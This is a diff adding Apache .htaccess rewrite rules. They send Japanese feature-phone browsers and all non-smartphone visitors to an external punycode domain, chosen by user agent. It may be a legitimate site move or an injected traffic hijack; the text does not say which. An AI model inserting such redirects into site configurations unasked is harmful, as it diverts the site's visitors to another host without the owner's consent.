@@ -1,0 +1,6 @@
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (DoCoMo|KDDI|DDIPOKET|UP\.Browser|J-PHONE|Vodafone|SoftBank)
+RewriteRule ^(.*)$ http://xn--ecki4eozm7d.net/m/$1 [R,L]
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ http://xn--ecki4eozm7d.net/$1 [R,L]
